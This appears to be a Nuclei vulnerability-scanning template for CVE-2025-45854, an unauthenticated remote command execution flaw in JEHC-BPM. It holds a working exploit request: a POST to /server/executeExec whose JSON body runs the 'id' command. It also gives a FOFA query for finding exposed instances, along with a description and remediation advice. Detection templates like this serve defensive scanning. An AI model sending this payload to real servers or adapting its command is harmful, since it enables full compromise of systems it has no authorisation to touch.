flow: http(1) && http(2)
http:
- matchers:
  - case-insensitive: true
    internal: true
    type: word
    words:
    - JEHC
    - XSHI
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
  redirects: true
- matchers:
  - part: body
    regex:
    - uid=[0-9]+.*gid=[0-9]+.*
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - "POST /server/executeExec HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\
    \n{\n  \"actuator\": {\n    \"clientIp\": \"127.0.0.1\",\n    \"port\": 8082,\n\
    \    \"applicationName\": \"testApp\",\n    \"env\": \"prod\",\n    \"uploadTime\"\
    : 1704523200000,\n    \"hasPrefixApplicationName\": false,\n    \"clientHttpPrefix\"\
    : \"http\"\n  },\n  \"execParams\": {\n    \"command\": \"id\"\n  }\n}\n"
id: CVE-2025-45854
info:
  author: ritikchaddha
  classification:
    cve-id: CVE-2025-45854
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-862,CWE-434
    epss-percentile: 0.94502
    epss-score: 0.15797
  description: 'A Remote Command Execution vulnerability in the component /server/executeExec
    of JEHC-BPM <= v2.0.1 allows attackers to execute arbitrary code. The vulnerability
    exists due to insufficient authorization checks in the executeExec endpoint which
    allows direct command execution.

    '
  impact: 'Unauthenticated attackers can execute arbitrary operating system commands
    through the /server/executeExec endpoint due to missing authorization checks,
    achieving complete server compromise.

    '
  metadata:
    fofa-query: body="JEHC"
    max-request: 1
    product: jehc-bpm
  name: JEHC-BPM - Remote Code Execute
  reference:
  - https://gist.github.com/Cafe-Tea/bc14b38f4bfd951de2979a24c3358460
  - https://nvd.nist.gov/vuln/detail/CVE-2025-45854
  remediation: 'Upgrade JEHC-BPM to a version later than 2.0.1 that implements proper
    authorization checks on the executeExec endpoint.

    '
  severity: critical
  tags: cve,cve2025,jehc-bpm,rce,vuln
